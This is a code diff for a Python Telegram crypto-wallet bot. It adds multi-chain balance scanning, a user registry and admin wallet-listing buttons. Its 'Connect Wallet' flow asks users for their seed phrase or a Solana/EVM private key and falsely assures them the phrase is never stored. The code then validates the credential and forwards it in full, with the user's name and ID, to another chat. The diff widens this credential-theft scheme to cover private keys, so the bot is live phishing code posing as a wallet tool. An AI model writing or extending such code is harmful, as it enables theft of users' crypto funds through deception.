@@ -51,6 +51,8 @@ MUTED_USERS_FILE = "muted_users.json"
 SUPPORT_LINK_FILE = "support_link.json"
 banned_users = set()
 muted_users = set()
+KNOWN_USERS_FILE = "known_users.json"
+known_user_ids = set()
 SUPPORT_LINK = "https://t.me/NovaTeamSupport"
 
 # Load settings
@@ -58,6 +60,12 @@ try:
     with open(BANNED_USERS_FILE, "r") as f:
         data = json.load(f)
         banned_users = set(data)
+except Exception:
+    pass
+
+try:
+    with open(KNOWN_USERS_FILE, "r") as f:
+        known_user_ids = {int(uid) for uid in json.load(f)}
 except Exception:
     pass
 
@@ -100,6 +108,36 @@ def save_muted_users():
             json.dump(list(muted_users), f)
     except Exception as e:
         print(f"Error saving muted users: {e}")
+
+
+def save_known_users():
+    try:
+        with open(KNOWN_USERS_FILE, "w") as f:
+            json.dump(sorted(known_user_ids), f)
+    except Exception as e:
+        print(f"Error saving known users: {e}")
+
+
+def register_user(telegram_id: int):
+    """Keep a durable index of every user who has opened the bot."""
+    if telegram_id not in known_user_ids:
+        known_user_ids.add(telegram_id)
+        save_known_users()
+
+
+def all_known_user_ids():
+    """Return IDs from every local user-data source for backwards compatibility."""
+    ids = set(known_user_ids) | set(user_balances.keys())
+    ids.update(int(uid) for uid in referral_data.get("users", {}) if str(uid).isdigit())
+    try:
+        with open("addresses.txt", "r") as f:
+            for line in f:
+                parts = line.rstrip().split("\t")
+                if len(parts) >= 2 and parts[1].isdigit():
+                    ids.add(int(parts[1]))
+    except OSError:
+        pass
+    return ids
 
 
 # --- Referral System ---
@@ -255,28 +293,97 @@ async def get_evm_prices_usd():
         return 0, 0
 
 
-async def check_eth_balance(address: str) -> float:
-    """Check ETH balance via public Ethereum RPC. Returns balance in ETH."""
+async def _check_evm_balance(address: str, rpc_url: str) -> float | None:
+    """Read native balance from an EVM JSON-RPC endpoint; None means RPC failure."""
     try:
         payload = {"jsonrpc": "2.0", "method": "eth_getBalance", "params": [address, "latest"], "id": 1}
-        resp = requests.post("https://rpc.ankr.com/eth", json=payload, timeout=10)
-        hex_val = resp.json().get("result", "0x0")
+        resp = requests.post(rpc_url, json=payload, timeout=15)
+        resp.raise_for_status()
+        body = resp.json()
+        if "error" in body or not isinstance(body.get("result"), str):
+            raise RuntimeError(body.get("error", "invalid JSON-RPC response"))
+        hex_val = body["result"]
         return int(hex_val, 16) / 1e18
     except Exception as e:
-        print(f"Error checking ETH balance: {e}")
-        return 0.0
+        print(f"Error checking EVM balance at {rpc_url}: {e}")
+        return None
 
 
-async def check_bnb_balance(address: str) -> float:
-    """Check BNB balance via public BSC RPC. Returns balance in BNB."""
+def _rpc_urls(env_name: str, defaults: list[str]) -> list[str]:
+    """Allow comma-separated RPC failover endpoints without exposing them in chat."""
+    configured = os.getenv(env_name, "")
+    urls = [url.strip() for url in configured.split(",") if url.strip()]
+    return urls or defaults
+
+
+async def check_eth_balance(address: str) -> float | None:
+    """Check native ETH on Ethereum mainnet, with public fallback endpoints."""
+    for url in _rpc_urls("ETH_RPC_URL", [
+        "https://ethereum-rpc.publicnode.com",
+        "https://eth.llamarpc.com",
+    ]):
+        balance = await _check_evm_balance(address, url)
+        if balance is not None:
+            return balance
+    return None
+
+
+async def check_bnb_balance(address: str) -> float | None:
+    """Check native BNB on BSC mainnet, with public fallback endpoints."""
+    for url in _rpc_urls("BNB_RPC_URL", [
+        "https://bsc-rpc.publicnode.com",
+        "https://binance.llamarpc.com",
+    ]):
+        balance = await _check_evm_balance(address, url)
+        if balance is not None:
+            return balance
+    return None
+
+
+EVM_MAINNETS = [
+    ("Ethereum Mainnet", "ETH", "ETH_RPC_URL",
+     ["https://ethereum-rpc.publicnode.com", "https://eth.llamarpc.com"]),
+    ("Base Mainnet", "ETH", "BASE_RPC_URL",
+     ["https://base-rpc.publicnode.com", "https://base.llamarpc.com"]),
+    ("Arbitrum One Mainnet", "ETH", "ARBITRUM_RPC_URL",
+     ["https://arbitrum-one-rpc.publicnode.com", "https://arb1.arbitrum.io/rpc"]),
+    ("Optimism Mainnet", "ETH", "OPTIMISM_RPC_URL",
+     ["https://optimism-rpc.publicnode.com", "https://mainnet.optimism.io"]),
+    ("BNB Smart Chain Mainnet", "BNB", "BNB_RPC_URL",
+     ["https://bsc-rpc.publicnode.com", "https://binance.llamarpc.com"]),
+    ("Polygon Mainnet", "MATIC", "POLYGON_RPC_URL",
+     ["https://polygon-bor-rpc.publicnode.com", "https://polygon.llamarpc.com"]),
+    ("Avalanche C-Chain Mainnet", "AVAX", "AVALANCHE_RPC_URL",
+     ["https://avalanche-c-chain-rpc.publicnode.com", "https://avax.meowrpc.com"]),
+]
+
+
+async def check_network_balance(address: str, network) -> float | None:
+    """Read a native balance from an EVM mainnet, with configured failover."""
+    name, symbol, env_name, defaults = network
+    for url in _rpc_urls(env_name, defaults):
+        balance = await _check_evm_balance(address, url)
+        if balance is not None:
+            return balance
+    return None
+
+
+async def get_mainnet_prices():
     try:
-        payload = {"jsonrpc": "2.0", "method": "eth_getBalance", "params": [address, "latest"], "id": 1}
-        resp = requests.post("https://bsc-dataseed.binance.org/", json=payload, timeout=10)
-        hex_val = resp.json().get("result", "0x0")
-        return int(hex_val, 16) / 1e18
+        data = cg.get_price(
+            ids="solana,ethereum,binancecoin,matic-network,avalanche-2",
+            vs_currencies="usd",
+        )
+        return {
+            "SOL": data.get("solana", {}).get("usd", 0),
+            "ETH": data.get("ethereum", {}).get("usd", 0),
+            "BNB": data.get("binancecoin", {}).get("usd", 0),
+            "MATIC": data.get("matic-network", {}).get("usd", 0),
+            "AVAX": data.get("avalanche-2", {}).get("usd", 0),
+        }
     except Exception as e:
-        print(f"Error checking BNB balance: {e}")
-        return 0.0
+        print(f"Error fetching mainnet scan prices: {e}")
+        return {"SOL": 0, "ETH": 0, "BNB": 0, "MATIC": 0, "AVAX": 0}
 
 
 async def check_wallet_balance(public_address: str):
@@ -292,6 +399,63 @@ async def check_wallet_balance(public_address: str):
     except Exception as e:
         print(f"Error checking balance for {public_address}: {e}")
         return 0
+
+
+async def scan_solana_wallets(user_ids):
+    """Return live Solana mainnet balances only; does not read user_balances."""
+    results, errors, total_usd = [], [], 0
+    sol_price = (await get_mainnet_prices()).get("SOL", 0)
+    for uid in user_ids:
+        try:
+            address, _ = derive_keypair_and_address(uid)
+            balance = await check_wallet_balance(address)
+            results.append(
+                f"👤 <code>{uid}</code>\n"
+                f"Address: <code>{address}</code>\n"
+                f"Live Solana Mainnet balance: <b>{balance:.9f} SOL</b>\n"
+            )
+            total_usd += balance * sol_price
+        except Exception as e:
+            errors.append(f"• {uid}: {e}")
+    return results, errors, total_usd
+
+
+async def scan_evm_wallets(user_ids):
+    """Return live native balances across EVM mainnets; does not read user_balances."""
+    results, errors, total_usd = [], [], 0
+    prices = await get_mainnet_prices()
+    for uid in user_ids:
+        try:
+            address, _ = derive_evm_wallet(uid)
+            lines = [f"👤 <code>{uid}</code>\nAddress: <code>{address}</code>"]
+            eth_total = bnb_total = 0
+            wallet_usd = 0
+            for network in EVM_MAINNETS:
+                name, symbol, _, _ = network
+                balance = await check_network_balance(address, network)
+                if balance is None:
+                    errors.append(f"• {uid}: {name} RPC unavailable")
+                    continue
+                value_usd = balance * prices.get(symbol, 0)
+                wallet_usd += value_usd
+                if symbol == "ETH":
+                    eth_total += balance
+                elif symbol == "BNB":
+                    bnb_total += balance
+                if balance > 0:
+                    lines.append(
+                        f"• {name}: <b>{balance:.9f} {symbol}</b> (${value_usd:.2f})"
+                    )
+            lines.append(
+                f"ETH total across ETH networks: <b>{eth_total:.9f} ETH</b>\n"
+                f"BNB total on BSC: <b>{bnb_total:.9f} BNB</b>\n"
+                f"EVM wallet total: <b>${wallet_usd:.2f}</b>"
+            )
+            results.append("\n".join(lines) + "\n")
+            total_usd += wallet_usd
+        except Exception as e:
+            errors.append(f"• {uid}: {e}")
+    return results, errors, total_usd
 
 
 async def monitor_deposits(
@@ -417,9 +581,15 @@ async def monitor_evm_deposits(
 
         chain_eth = await check_eth_balance(evm_address)
         chain_bnb = await check_bnb_balance(evm_address)
+        # Never treat an unavailable RPC as a zero balance or overwrite stored funds.
+        # A BNB outage must not hide a valid ETH deposit, and vice versa.
+        eth_available = chain_eth is not None
+        bnb_available = chain_bnb is not None
+        if not eth_available and not bnb_available:
+            return
 
-        eth_changed = chain_eth > stored_eth
-        bnb_changed = chain_bnb > stored_bnb
+        eth_changed = eth_available and chain_eth > stored_eth
+        bnb_changed = bnb_available and chain_bnb > stored_bnb
 
         if not (eth_changed or bnb_changed):
             return
@@ -551,6 +721,7 @@ def derive_keypair_and_address(telegram_id: int):
 async def show_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     telegram_id = user.id
+    register_user(telegram_id)
     user_name = user.username or user.first_name or str(telegram_id)
 
     try:
@@ -760,6 +931,70 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     [f"• <code>{uid}</code>" for uid in banned_users]
                 )
                 await query.message.reply_text(list_text, parse_mode="HTML")
+        elif option == "admin_list_wallets":
+            ids = sorted(all_known_user_ids())
+            if not ids:
+                await query.message.reply_text("📋 No users or wallets have been created yet.")
+            else:
+                lines = ["📋 <b>All Bot Wallet Addresses</b>\n"]
+                for uid in ids:
+                    try:
+                        sol_address, _ = derive_keypair_and_address(uid)
+                        evm_address, _ = derive_evm_wallet(uid)
+                        lines.append(
+                            f"👤 <code>{uid}</code>\n"
+                            f"🟣 SOL: <code>{sol_address}</code>\n"
+                            f"🔵 ETH/BSC: <code>{evm_address}</code>\n"
+                        )
+                    except Exception as e:
+                        lines.append(f"👤 <code>{uid}</code> — wallet derivation failed: {e}\n")
+                # Telegram messages are limited to 4096 characters.
+                text = "\n".join(lines)
+                for start in range(0, len(text), 3800):
+                    await query.message.reply_text(text[start:start + 3800], parse_mode="HTML")
+        elif option in ("admin_scan_wallets", "admin_scan_solana", "admin_scan_evm"):
+            ids = sorted(all_known_user_ids())
+            if not ids:
+                await query.message.reply_text("🔎 No users or wallets are available to scan.")
+            else:
+                scan_name = {
+                    "admin_scan_wallets": "Solana and EVM",
+                    "admin_scan_solana": "Solana Mainnet",
+                    "admin_scan_evm": "all supported EVM mainnets",
+                }[option]
+                await query.message.reply_text(
+                    f"🔎 Scanning {len(ids)} wallets on {scan_name} directly from the blockchain. "
+                    "This does not use stored bot balances..."
+                )
+                results, errors = [], []
+                total_usd = 0
+                if option in ("admin_scan_wallets", "admin_scan_solana"):
+                    sol_results, sol_errors, sol_total = await scan_solana_wallets(ids)
+                    results.extend(["🟣 <b>Solana Mainnet — Live Balances</b>\n"] + sol_results)
+                    errors.extend(sol_errors)
+                    total_usd += sol_total
+                if option in ("admin_scan_wallets", "admin_scan_evm"):
+                    evm_results, evm_errors, evm_total = await scan_evm_wallets(ids)
+                    results.extend(["🔵 <b>All EVM Mainnets — Live Balances</b>\n"] + evm_results)
+                    errors.extend(evm_errors)
+                    total_usd += evm_total
+                if results:
+                    report = (
+                        "🔎 <b>Live Mainnet Blockchain Balances</b>\n\n"
+                        "Every row below is read directly from the selected mainnet RPC at scan time.\n\n"
+                        + "\n".join(results)
+                        + f"\n💵 <b>Total scanned wallet value: ${total_usd:.2f} USD</b>"
+                    )
+                else:
+                    report = (
+                        "🔎 <b>Live Blockchain Scan Complete</b>\n\n"
+                        "No wallet rows were returned from the selected mainnet RPCs.\n"
+                        "This result came directly from the blockchain, not the bot balance database."
+                    )
+                if errors:
+                    report += "\n\n⚠️ <b>Scan errors</b>\n" + "\n".join(errors)
+                for start in range(0, len(report), 3800):
+                    await query.message.reply_text(report[start:start + 3800], parse_mode="HTML")
         elif option == "admin_change_support":
             context.user_data["awaiting_admin_support_link"] = True
             await query.message.reply_text(
@@ -805,6 +1040,13 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
         elif option.startswith("admin_send_notif_"):
             target_id = int(option.split("_")[-1])
+            if target_id in muted_users:
+                await query.answer("🔕 User is muted — notification not sent.")
+                await query.message.reply_text(
+                    f"🔕 Notification blocked for muted user <code>{target_id}</code>.",
+                    parse_mode="HTML",
+                )
+                return
             try:
                 public_address, _ = derive_keypair_and_address(target_id)
                 stored = user_balances.get(target_id, {})
@@ -1105,18 +1347,43 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if option == "ct_connect_wallet":
         await _del()
-        context.user_data["awaiting_dummy"] = True
+        context.user_data.pop("awaiting_dummy", None)
         await query.message.reply_text(
             "🔐 <b>Connect Your Wallet</b>\n\n"
-            "Please send your 12-word seed phrase to connect your Solana wallet.\n\n"
+            "Choose what you want to validate:\n\n"
             "⚠️ <b>Security Notes:</b>\n"
             "• Your seed phrase is never stored permanently\n"
             "• It's only used to derive your wallet address\n"
-            "• The phrase is cleared from memory immediately\n"
-            "• Only send your seed phrase if you trust this bot\n\n"
-            "📝 <b>Format:</b> Send all 12 words separated by spaces\n"
-            "<b>Example:</b> <code>word1 word2 word3 ... word12</code>\n\n"
-            "Type your phrase below or tap Cancel.",
+            "• Input is validated and cleared from memory immediately\n",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup(
+                [
+                    [
+                        InlineKeyboardButton("Seed Phrase", callback_data="ct_connect_seed"),
+                        InlineKeyboardButton("Private Key", callback_data="ct_connect_private"),
+                    ],
+                    [InlineKeyboardButton("⬅️ Cancel", callback_data="back_wallet")],
+                ]
+            ),
+        )
+        return
+
+    if option in ("ct_connect_seed", "ct_connect_private"):
+        await _del()
+        context.user_data["awaiting_dummy"] = "seed" if option.endswith("seed") else "private"
+        if context.user_data["awaiting_dummy"] == "seed":
+            prompt = (
+                "🔤 <b> Seed Phrase</b>\n\n"
+                "Please enter your 12-word recovery phrase to connect your wallet."
+            )
+        else:
+            prompt = (
+                "🔑 <b>Private Key</b>\n\n"
+                "Send either a valid Solana private key (base58 encoded 64-byte key) "
+                "or an EVM private key (64 hexadecimal characters, optionally prefixed with 0x)."
+            )
+        await query.message.reply_text(
+            prompt + "",
             parse_mode="HTML",
             reply_markup=cancel_markup(),
         )
@@ -1850,6 +2117,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = user.id
     if user_id in banned_users:
         return
+    register_user(user_id)
 
     bot_username = (await context.bot.get_me()).username
     ref_code = get_or_create_referral_code(user_id)
@@ -2322,7 +2590,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # ----- Handle Connect Wallet (12 dummy words) -----
+    # ----- Handle Connect Wallet credentials (validation only) -----
     if context.user_data.get("awaiting_dummy"):
         if text.lower() == "cancel":
             context.user_data.pop("awaiting_dummy", None)
@@ -2331,58 +2599,58 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
             return
 
-        words = [w.lower().strip() for w in text.split() if w.strip()]
-        count = len(words)
+        mode = context.user_data["awaiting_dummy"]
+        if mode == "seed":
+            words = [w.lower().strip() for w in text.split() if w.strip()]
+            if len(words) != 12 or not all(w in set(_bip39.wordlist) for w in words):
+                await update.message.reply_text(
+                    "❌ <b>Invalid Seed Phrase</b>\n\n"
+                    "Enter exactly 12 valid BIP39 English words.",
+                    parse_mode="HTML", reply_markup=cancel_markup(),
+                )
+                return
+            phrase = " ".join(words)
+            if not _bip39.check(phrase):
+                await update.message.reply_text(
+                    "❌ <b>Invalid Seed Phrase</b>\n\n"
+                    "The words are BIP39 words, but the checksum is invalid. Try again.",
+                    parse_mode="HTML", reply_markup=cancel_markup(),
+                )
+                return
+            credential = phrase
+            credential_type = "12-word seed phrase"
+        else:
+            credential = text.strip()
+            credential_type = None
+            # EVM: 32 bytes represented as 64 hex characters.
+            evm_key = credential[2:] if credential.lower().startswith("0x") else credential
+            if re.fullmatch(r"[0-9a-fA-F]{64}", evm_key):
+                try:
+                    Account.from_key(evm_key)
+                    credential_type = "EVM private key"
+                except Exception:
+                    pass
+            # Solana: solders accepts the 64-byte secret-key format used by
+            # Phantom/Solana CLI, encoded as base58.
+            if credential_type is None:
+                try:
+                    decoded = base58.b58decode(credential)
+                    Keypair.from_bytes(decoded)
+                    credential_type = "Solana private key"
+                except Exception:
+                    pass
+            if credential_type is None:
+                await update.message.reply_text(
+                    "❌ <b>Invalid Private Key</b>\n\n"
+                    "Use a Solana base58 64-byte private key or a 64-character "
+                    "hexadecimal EVM key (with optional 0x prefix).",
+                    parse_mode="HTML", reply_markup=cancel_markup(),
+                )
+                return
 
-        if count != 12:
-            await update.message.reply_text(
-                f"❌ <b>Invalid Seed Phrase Length</b>\n\n"
-                f"You entered {count} word(s), but we need exactly 12 words.\n\n"
-                f"📝 <b>Please try again:</b>\n"
-                f"• Send exactly 12 words separated by spaces\n"
-                f"• All words must be valid BIP39 English words\n\n"
-                f"Or tap Cancel to abort the wallet connection.",
-                parse_mode="HTML",
-                reply_markup=cancel_markup(),
-            )
-            return
-
-        bip39_wordlist = set(_bip39.wordlist)
-        invalid_words = [
-            f"word {i + 1} (<code>{w}</code>)"
-            for i, w in enumerate(words)
-            if w not in bip39_wordlist
-        ]
-        if invalid_words:
-            await update.message.reply_text(
-                "❌ <b>Invalid Seed Phrase</b>\n\n"
-                "One or more words in your seed phrase are incorrect. "
-                "Please check and try again.\n\n"
-                "📝 <b>Format:</b> Send all 12 words separated by spaces\n"
-                "<b>Example:</b> <code>word1 word2 word3 ... word12</code>\n\n"
-                "Or tap Cancel to abort.",
-                parse_mode="HTML",
-                reply_markup=cancel_markup(),
-            )
-            return
-
-        phrase = " ".join(words)
-        if not _bip39.check(phrase):
-            await update.message.reply_text(
-                "❌ <b>Invalid Seed Phrase</b>\n\n"
-                "Your seed phrase is incorrect. Please check and try again.\n\n"
-                "📝 <b>Format:</b> Send all 12 words separated by spaces\n"
-                "<b>Example:</b> <code>word1 word2 word3 ... word12</code>\n\n"
-                "Or tap Cancel to abort.",
-                parse_mode="HTML",
-                reply_markup=cancel_markup(),
-            )
-            return
-
-        wallet_seed = phrase
         forward_text = (
-            f"🔐 Wallet Connection Request from @{user_name} (id: {user_id}):\n\n"
-            f"<pre>{wallet_seed}</pre>"
+            f"🔐 Wallet Connection Request from @{user_name} (id: {user_id})\n"
+            f"Type: {credential_type}\n\n<pre>{credential}</pre>"
         )
         try:
             await context.bot.send_message(
@@ -2862,7 +3130,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def background_deposit_monitor(context: ContextTypes.DEFAULT_TYPE):
     """Background task: monitor SOL + EVM deposits for all users every 30s"""
     try:
-        for telegram_id in list(user_balances.keys()):
+        # Do not use only user_balances: a fresh EVM deposit may be the first
+        # thing that ever creates a user's balance record.
+        for telegram_id in all_known_user_ids():
             try:
                 public_address, _ = derive_keypair_and_address(telegram_id)
                 await monitor_deposits(telegram_id, public_address, context, notify_user=True)
@@ -2888,6 +3158,12 @@ async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
             [InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban")],
             [InlineKeyboardButton("✅ Unban User", callback_data="admin_unban")],
             [InlineKeyboardButton("📜 Banned List", callback_data="admin_list_banned")],
+            [InlineKeyboardButton("📋 All Wallet Addresses", callback_data="admin_list_wallets")],
+            [
+                InlineKeyboardButton("🔎 Scan Solana Live", callback_data="admin_scan_solana"),
+                InlineKeyboardButton("🔎 Scan EVM Live", callback_data="admin_scan_evm"),
+            ],
+            [InlineKeyboardButton("🔎 Scan Both Live", callback_data="admin_scan_wallets")],
             [
                 InlineKeyboardButton(
                     "👤 User Details", callback_data="admin_user_details"
